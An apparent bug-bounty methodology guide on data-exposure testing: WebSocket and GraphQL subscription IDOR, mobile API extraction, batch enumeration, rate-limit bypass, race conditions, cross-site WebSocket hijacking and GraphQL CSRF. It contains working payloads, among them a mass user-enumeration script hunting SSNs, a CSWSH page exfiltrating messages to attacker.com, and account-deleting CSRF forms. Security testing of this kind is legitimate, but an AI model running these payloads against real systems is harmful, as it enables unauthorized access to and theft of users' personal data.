# Advanced Data Exposure Patterns — WebSocket IDOR, Mobile APIs, GraphQL Subscriptions, Batch IDOR

## Table of Contents
1. WebSocket IDOR
2. Mobile API Testing
3. GraphQL Subscription Attacks
4. Batch Request IDOR
5. Rate Limit Adaptation During Active Testing
6. When to Stop and Move On

---

## 1. WebSocket IDOR

WebSocket connections are real-time and stateful — authentication happens at connection time, but authorization per-message is often missing entirely.

### Identify WebSocket Usage
```javascript
// In browser DevTools → Network → WS tab
// Look for connections to:
// wss://target.com/ws
// wss://target.com/cable (Rails ActionCable)
// wss://target.com/socket.io
// wss://target.com/graphql (GraphQL subscriptions)
// wss://target.com/realtime

// In JS source:
new WebSocket("wss://...")
io.connect("wss://...")
```

### Attack: Subscription Channel IDOR
Real-time apps use channels/rooms to scope data. If channel IDs are predictable:
```javascript
// Connect as User A, subscribe to another user's channel:
ws.send(JSON.stringify({
  "command": "subscribe",
  "identifier": JSON.stringify({
    "channel": "UserChannel",
    "user_id": 12345  // ← another user's ID
  })
}))

// Or for order tracking:
ws.send(JSON.stringify({
  "type": "subscribe",
  "channel": "order_updates",
  "order_id": "ORD-9999"  // ← another user's order
}))
```

### Attack: Message Handler IDOR
After connecting, send messages with other users' resource IDs:
```javascript
// Request another user's live data:
ws.send(JSON.stringify({"action": "get_status", "user_id": 9999}))
ws.send(JSON.stringify({"type": "read_messages", "thread_id": 9999}))
ws.send(JSON.stringify({"event": "join_room", "room_id": "PRIVATE_ROOM_ID"}))
```

### Attack: ActionCable (Rails) IDOR
ActionCable is common and frequently misconfigured:
```javascript
// Standard ActionCable subscribe:
App.cable.subscriptions.create({
  channel: "ConversationChannel",
  conversation_id: 9999  // try other users' conversation IDs
})

// Or via HTTP upgrade:
GET /cable HTTP/1.1
Upgrade: websocket
// Then send: {"command":"subscribe","identifier":"{\"channel\":\"AdminChannel\"}"}
// Admin channel without admin role?
```

### Attack: WebSocket Authentication Bypass
```javascript
// Some apps validate auth on HTTP upgrade but not on subsequent messages:
// 1. Connect with valid auth token
// 2. Authenticate: ws.send({"type": "auth", "token": "VALID_TOKEN"})
// 3. Logout (invalidate server-side session)
// 4. Continue sending messages — does the server still process them?

// Also test: connect without any auth token at all
// Some WS handlers skip auth if no token is provided
```

### Burp Suite WebSocket Testing
```
1. Proxy → WebSockets History
2. Right-click a message → "Send to Repeater"
3. Modify channel/room/user IDs in the message body
4. Send and observe response
```

---

## 2. Mobile API Testing

Mobile apps often call backend APIs not accessible from the web frontend. These mobile APIs typically have:
- Fewer rate limits
- Less mature security reviews
- More verbose error messages
- Older API versions still in production

### Extract Mobile API Endpoints

**Android APK:**
```bash
# Decompile with jadx:
jadx -d output/ target.apk

# Find API endpoints:
grep -r "https://" output/ | grep -v ".png\|.jpg\|.ttf" | sort -u
grep -r "api\." output/ | grep -v "import\|//\|test" | sort -u

# Find hardcoded secrets:
grep -r "api_key\|apiKey\|client_secret\|Bearer\|token" output/ | grep -v "import"

# Extract base URLs:
grep -r "BASE_URL\|baseUrl\|BASE_API" output/
```

**iOS IPA:**
```bash
# Extract IPA:
unzip app.ipa -d extracted/

# Find endpoints in binary:
strings extracted/Payload/*.app/AppBinary | grep "https://" | sort -u
strings extracted/Payload/*.app/AppBinary | grep "api\." | sort -u

# Check for hardcoded keys:
strings extracted/Payload/*.app/AppBinary | grep -i "key\|secret\|token\|password"
```

**Frida (runtime extraction):**
```javascript
// Intercept network calls at runtime:
Java.perform(function() {
  var OkHttpClient = Java.use("okhttp3.OkHttpClient");
  // Hook the execute method to log all requests
})
```

### Mobile-Specific Attack Vectors

**Different API versions for mobile:**
```
# Web uses: /api/v3/
# Mobile may use: /api/v1/ or /mobile/api/ or /app/v2/
# These older versions often lack security improvements

# Try mobile-specific headers:
User-Agent: TargetApp/3.2.1 (iPhone; iOS 16.0)
X-App-Version: 3.2.1
X-Platform: ios
X-Device-ID: [any UUID]
```

**Certificate Pinning Bypass (for interception):**
```bash
# Frida-based bypass:
frida -U -f com.target.app -l ssl-pinning-bypass.js

# Objection:
objection --gadget com.target.app explore
ios sslpinning disable

# After bypass, route through Burp normally
```

**API Key Extraction:**
```bash
# Mobile apps frequently contain hardcoded API keys
# Search extracted APK/IPA for common key patterns:
grep -r "AAAA\|sk_live\|pk_live\|AIza\|ya29\." output/  # Firebase, Stripe, Google
grep -r "[A-Za-z0-9_-]{32,}" output/ | grep -v "import\|package\|//\|base64"
```

**Testing Mobile Endpoints:**
```bash
# Add mobile headers to standard web requests:
curl -H "User-Agent: TargetApp/3.2.1 (iPhone; iOS 16.0)" \
     -H "X-App-Version: 3.2.1" \
     -H "Authorization: Bearer YOUR_TOKEN" \
     "https://api.target.com/mobile/v1/users/me"

# Try mobile-only endpoints found in APK:
curl -H "X-Platform: android" "https://api.target.com/mobile/admin/debug"
```

---

## 3. GraphQL Subscription Attacks

GraphQL subscriptions are WebSocket-based real-time queries. They have the same IDOR problems as REST but are less frequently tested.

### Identify GraphQL Subscriptions
```
# In the schema (via introspection):
{
  __schema {
    subscriptionType {
      fields {
        name
        type { name }
        args { name type { name } }
      }
    }
  }
}

# Common subscription names:
# onOrderUpdate, onMessageReceived, onUserActivity
# orderUpdated, messageAdded, notificationCreated
```

### Attack: Subscribe to Another User's Events
```graphql
# Standard subscription for your own data:
subscription {
  onOrderUpdate(orderId: "YOUR_ORDER_ID") {
    status
    items { name price }
    shippingAddress { street city }
  }
}

# IDOR: subscribe to someone else's order:
subscription {
  onOrderUpdate(orderId: "OTHER_USERS_ORDER_ID") {
    status
    items { name price }
    shippingAddress { street city }  # their address
  }
}
```

### Attack: Wildcard Subscriptions
```graphql
# Does the subscription support wildcard or null ID?
subscription {
  onOrderUpdate(orderId: null) {
    # Receives all order updates from all users?
    orderId status user { email ssn }
  }
}

subscription {
  onMessageReceived {  # No user/room filter
    sender { email }
    content
    timestamp
  }
}
```

### Attack: Subscription Authentication Bypass
```
# Subscriptions use WebSocket — test if the auth check on upgrade is separate from subscription auth:
1. Connect to WS endpoint with valid token
2. Subscribe to a channel
3. Revoke/expire your token
4. Keep receiving subscription events — are you still subscribed?

# Also: connect without token, then subscribe:
ws = new WebSocket("wss://target.com/graphql")
ws.onopen = () => {
  ws.send(JSON.stringify({
    type: "start",
    id: "1",
    payload: {
      query: "subscription { onMessageReceived { content user { email } } }"
    }
  }))
}
```

---

## 4. Batch Request IDOR

Many APIs support batch requests — requesting multiple objects in one call. This often bypasses per-request authorization checks.

### REST Batch Endpoints
```bash
# Some REST APIs support batch fetching:
POST /api/users/batch
{"ids": [1234, 5678, 9012]}

# Or via query params:
GET /api/users?ids=1234,5678,9012
GET /api/users?id[]=1234&id[]=5678&id[]=9012

# Or via comma-separated:
GET /api/documents/1234,5678,9012
GET /api/orders/ORD001,ORD002,ORD003
```

**What to test:**
```bash
# 1. Include your own ID + other users' IDs:
POST /api/users/batch
{"ids": [YOUR_ID, OTHER_ID_1, OTHER_ID_2]}

# 2. Only other users' IDs (no own ID):
POST /api/users/batch
{"ids": [OTHER_ID_1, OTHER_ID_2]}

# 3. Large batch to test if any slip through:
POST /api/users/batch
{"ids": [1, 2, 3, 4, 5, ..., 1000]}
# If the batch endpoint has looser auth than individual endpoints,
# some records may be returned that individual requests would deny

# 4. Mix valid and invalid IDs:
POST /api/users/batch
{"ids": [YOUR_VALID_ID, "INVALID", OTHER_ID]}
# Some implementations skip auth check on IDs that return 404,
# but return data for IDs that exist — including unauthorized ones
```

### GraphQL Batch Requests
```graphql
# Array of operations:
[
  {"query": "{ user(id: \"1001\") { email ssn } }"},
  {"query": "{ user(id: \"1002\") { email ssn } }"},
  {"query": "{ user(id: \"1003\") { email ssn } }"}
]

# Alias batching (single request):
query {
  u1: user(id: "1001") { email ssn dob }
  u2: user(id: "1002") { email ssn dob }
  u3: user(id: "1003") { email ssn dob }
}
```

### Batch Request Rate Limit Bypass
```python
# Some rate limiters count requests, not objects:
# 1 request with 1000 IDs = same rate limit cost as 1 request with 1 ID
# This lets you enumerate at 1000x the normal rate

import requests

session = requests.Session()
session.headers['Authorization'] = 'Bearer YOUR_TOKEN'

# Collect 1000 IDs per batch request
batch_size = 1000
all_ids = list(range(1, 50001))  # IDs 1-50000

for i in range(0, len(all_ids), batch_size):
    batch = all_ids[i:i+batch_size]
    r = session.post('https://target.com/api/users/batch',
                     json={'ids': batch}, timeout=30)

    if r.status_code == 200:
        users = r.json().get('users', [])
        # Look for T1 fields in returned users
        for user in users:
            if any(f in user for f in ['ssn', 'dob', 'password_hash']):
                print(f"T1 data found: {user['id']}")

    time.sleep(1)  # Respect rate limits
```

---

## 5. Rate Limit Adaptation During Active Testing

When you hit rate limits mid-hunt (not just in PoC scripts):

### Detect What Type of Rate Limit You're Hitting
```python
# Test different dimensions:
# 1. Per-IP: rotate IPs (VPN, proxy) — does the limit reset?
# 2. Per-account: rotate accounts — does the limit reset?
# 3. Per-endpoint: is limit per-endpoint or global?
# 4. Per-token: is limit tied to your auth token or your account?
# 5. Sliding window or fixed window: wait 60s and retry — does it reset?

def probe_rate_limit(endpoint, auth_token):
    results = []
    for i in range(20):
        r = requests.get(endpoint, headers={'Authorization': auth_token})
        results.append({
            'attempt': i,
            'status': r.status_code,
            'remaining': r.headers.get('X-RateLimit-Remaining'),
            'reset': r.headers.get('X-RateLimit-Reset'),
            'retry_after': r.headers.get('Retry-After')
        })
        if r.status_code == 429:
            print(f"Rate limited at attempt {i}")
            print(f"Headers: {dict(r.headers)}")
            break
    return results
```

### Bypass Techniques During Testing
```bash
# 1. Slow down and add jitter:
time.sleep(random.uniform(2, 5))

# 2. Rotate between multiple test accounts:
tokens = ['token_account_a', 'token_account_b', 'token_account_c']
current_token = itertools.cycle(tokens)

# 3. Distribute across endpoints (sometimes limits are per-endpoint):
# Test /api/users/{id} from Account A
# Test /api/orders/{id} from Account B simultaneously

# 4. Use HEAD requests where possible (lighter weight, sometimes different limits):
requests.head(endpoint, headers=auth_headers)

# 5. Cache what you've learned — don't repeat requests unnecessarily:
seen_ids = set()
if object_id not in seen_ids:
    seen_ids.add(object_id)
    test_idor(object_id)
```

---

## 6. When to Stop and Move On

### Stop Testing an Endpoint
```
✗ 10+ IDOR ID variations tried with no cross-account access
✗ UUIDs confirmed random with no leakage vector found
✗ Rate limited to 1 req/min with no bypass possible
✗ WAF blocking all enumeration attempts
→ Document the endpoint, note the defenses, move to next attack surface
```

### Stop Testing a Target
```
✗ All endpoint categories tested (profile, orders, messages, docs, admin)
✗ GraphQL fully enumerated — all fields require proper auth
✗ No mass exposure endpoints found after 3+ hours
✗ Mobile API has same security posture as web API
→ Move on. Return in 30 days — implementations change.
→ Check for new features / API versions in 30 days
```

### Confidence Threshold Before Reporting
Only report when you have:
1. **Two different victim records confirmed** — rules out coincidence or your own data
2. **Sensitive field identified** — not just an ID or username
3. **Scale estimated** — either mass exposure count or IDOR on multiple IDs
4. **Curl-reproducible PoC** — triager can confirm without you

If you only have #1 but the data is low-sensitivity (T4) — consider if it's worth reporting based on the program's minimum severity threshold.

---

## 7. Race Condition IDOR

Race conditions create temporal windows where authorization checks pass simultaneously for multiple requests, enabling access control bypass.

### Single-Packet Attack (PortSwigger Research, 2023)
HTTP/2 allows multiple requests to be sent in one TCP packet, creating sub-1ms concurrency windows that reliably trigger races.

**How to use in Burp Suite:**
1. Send the target request to Turbo Intruder
2. Use the `http2-race.py` script template
3. Configure 20-30 parallel requests to the same endpoint
4. Hold the final byte, then send all simultaneously

**Race condition targets for IDOR:**
```
# Ownership transfer race:
# Thread A: change document owner to attacker
# Thread B: read document as victim (races before ownership commits)
# Result: attacker reads document between creation and permission assignment

# Batch delete race:
# Send DELETE /api/documents/[victim_id] 30 times simultaneously
# One may slip through before the auth check registers the previous failure

# Limit overrun that exposes data:
# POST /api/export?user_id=victim_id (x20 parallel)
# Export limit may be checked and passed by all 20 before counter increments
```

### Partial Construction Window
Between object creation and permission assignment, there's a window where an object exists with no owner:
```
# Create your account:
POST /api/register → {user_id: 9999, status: "pending"}
# Between "pending" and permission assignment:
GET /api/users/9999  → may return data without authorization check
                       (auth check requires status = "active", not yet set)

# Test: Submit requests to newly created objects within milliseconds
```

### Limit Bypass Race (free → paid features)
```
# If an action is rate-limited (e.g., 1 export per day):
# Submit 30 simultaneous export requests
# All 30 may be processed before the counter increments
# Each export contains another user's data
```

**Tools:** Burp Suite Turbo Intruder (`http2-single-packet-attack.py`), Burp Repeater with "Send group in parallel" option.

---

## 8. Cross-Site WebSocket Hijacking (CSWSH)

When a WebSocket handshake authenticates only via cookies (no CSRF token in the Upgrade request), a malicious page can hijack the connection.

### Vulnerability Condition
```
GET /websocket HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Cookie: session=victim_token
# No CSRF token / Origin check
```

If the server doesn't validate the `Origin` header or require a CSRF token in the WebSocket handshake, any website can initiate the connection on behalf of a logged-in victim.

### Attack: Data Exfiltration via CSWSH
```html
<!-- Attacker's page (victim visits this) -->
<script>
var ws = new WebSocket('wss://vulnerable.com/ws/chat');

ws.onopen = function() {
    // Request victim's message history
    ws.send(JSON.stringify({"action": "getHistory", "limit": 100}));
    ws.send(JSON.stringify({"action": "getProfile"}));
};

ws.onmessage = function(event) {
    // Exfiltrate all received messages to attacker
    fetch('https://attacker.com/collect?data=' + btoa(event.data));
};
</script>
```
The victim's browser sends their session cookie automatically. The attacker receives all messages.

### Testing for CSWSH
1. Find a WebSocket endpoint that authenticates via cookies
2. Check: does the handshake include a CSRF token or Origin validation?
3. If not → test from a different origin (use Burp's "Change Origin" feature)
4. If the connection is accepted from a cross-origin request → CSWSH vulnerable

```python
# Burp Collaborator CSWSH test payload:
# Create a page that connects to the WS endpoint and forwards all messages to Collaborator
# If Collaborator receives messages → confirmed vulnerability
```

### Impact Escalation
- If the WebSocket protocol allows sending data: attacker can take actions as the victim
- If the WebSocket receives sensitive data (messages, notifications, live updates): mass exfiltration
- Combine with stored XSS: inject the CSWSH attack into a page the user will visit

---

## 9. GraphQL Advanced Attacks

### Blind Schema Recovery (Clairvoyance)
When introspection is disabled, GraphQL still returns field suggestions in error messages:
```
{"errors": [{"message": "Cannot query field \"xyz\" on type \"Query\". Did you mean \"user\" or \"users\"?"}]}
```

**Tool:** Clairvoyance — sends random field names, collects suggestions, iteratively rebuilds the schema:
```bash
pip install clairvoyance
python -m clairvoyance https://target.com/graphql
# Outputs: schema.graphql (reconstructed from suggestions)
```

**Manual technique:** Send field names from a wordlist:
```bash
# Try common field names until the server suggests real ones:
{"query": "{ aaaa }"}   →  "Did you mean \"admin\"?"
{"query": "{ admin { aaaa } }"}  →  "Did you mean \"users\"?"
```

### Bypassing Disabled Introspection
Many apps disable `__schema` via regex but miss alternative forms:
```graphql
# Standard (blocked):
{ __schema { queryType { name } } }

# Bypasses (ignore whitespace in schema keyword):
{
  __schema
  { queryType { name } }
}

# Fragment-based bypass:
fragment f on __Schema { queryType { name } }
{ ...f }

# Newline injection:
{"query": "{\n  __schema\n  {queryType{name}}"}
```

### GraphQL CSRF
If the GraphQL endpoint accepts `application/x-www-form-urlencoded` or GET requests without CSRF protection:
```html
<!-- CSRF via form POST -->
<form action="https://target.com/graphql" method="POST">
  <input name="query" value='mutation { deleteAccount(id: "victim") { success } }'>
</form>
<script>document.forms[0].submit()</script>

<!-- CSRF via GET (if mutations are accepted) -->
<img src="https://target.com/graphql?query=mutation{deleteAccount(id:1){success}}">
```

**Test:** Can you execute a mutation from a `<form>` POST with `Content-Type: application/x-www-form-urlencoded`? If yes → CSRF on all mutations.
